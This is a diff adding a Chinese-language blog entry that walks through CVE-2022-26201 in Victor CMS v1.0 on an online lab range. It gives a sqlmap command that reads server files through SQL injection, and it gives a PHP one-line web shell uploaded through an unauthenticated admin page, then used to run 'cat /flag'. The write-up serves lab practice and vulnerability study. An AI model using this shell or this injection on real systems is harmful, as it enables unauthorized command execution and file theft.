@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CVE-2022-26201</title>
+      <link href="/2023/05/16/CVE-2022-26201/"/>
+      <url>/2023/05/16/CVE-2022-26201/</url>
+      
+        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>春秋云境：<a href="https://yunjing.ichunqiu.com/">https://yunjing.ichunqiu.com</a></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p> Victor CMS v1.0 存在二次注入漏洞  </p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h3 id="第一种方式获取flag"><a href="#第一种方式获取flag" class="headerlink" title="第一种方式获取flag"></a>第一种方式获取flag</h3><p>0x00 打开靶场环境</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33630456/1684155984127-a5246952-e4e1-4768-84c7-95f765bc85b2.png" alt="img"></p><p>0x01 访问Admin可以未授权登录</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33630456/1684156091057-9a8fc75b-7ccc-4230-a4b8-2ca6a91e5156.png" alt="img"></p><p>0x03 漏洞点在Category</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33630456/1684157247386-0a80d4b9-a007-47d7-978e-a90140a1179a.png" alt="img"></p><p>0x04 输入任意数字 使用burp进行抓包 保存为txt文件</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33630456/1684157292158-33458628-4037-4198-8cbb-2a274aaf1fda.png" alt="img"></p><p>0x05 打开sqlmap输入命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r test.txt --file-read &quot;/flag&quot; --dbms=mysql --batch --threads 10</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33630456/1684212166310-b4f847ad-0fa2-4e61-8359-2628445aceb4.png" alt="img"></p><p>文件保存在了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\14312\AppData\Local\sqlmap\output\eci-2ze2snbzgf66z4gn70br.cloudeci1.ichunqiu.com\files\_flag</span><br></pre></td></tr></table></figure><p>使用记事本打开</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33630456/1684212311762-4c385baf-6481-437b-a1c8-566d3efec964.png" alt="img"></p><h3 id="第二种方式获取flag"><a href="#第二种方式获取flag" class="headerlink" title="第二种方式获取flag"></a>第二种方式获取flag</h3><p>0x00 打开靶场环境</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33630456/1684155984127-a5246952-e4e1-4768-84c7-95f765bc85b2.png" alt="img"></p><p>0x01 访问Admin可以未授权登录</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33630456/1684156091057-9a8fc75b-7ccc-4230-a4b8-2ca6a91e5156.png" alt="img"></p><p>0x02 在Users -&gt; Add Users 上传一句话</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>]);<span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33630456/1684156535866-427c29f4-3dd3-4509-a132-5d46f647d7e8.png" alt="img">在 Users -&gt; View All Users 可以看见上传的一句话</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33630456/1684156700945-63a692d7-6217-473b-9bfa-866785f62716.png" alt="img">0x03 在地址栏执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://eci-2ze3ufosk9fyclp7o9o5.cloudeci1.ichunqiu.com/img/shell3.php?y=cat /flag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33630456/1684157042028-c58be01d-a3b5-4ba7-834e-4bff25307067.png" alt="img"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CVE-2022-25099</title>
       <link href="/2023/05/11/CVE-2022-25099/"/>
       <url>/2023/05/11/CVE-2022-25099/</url>
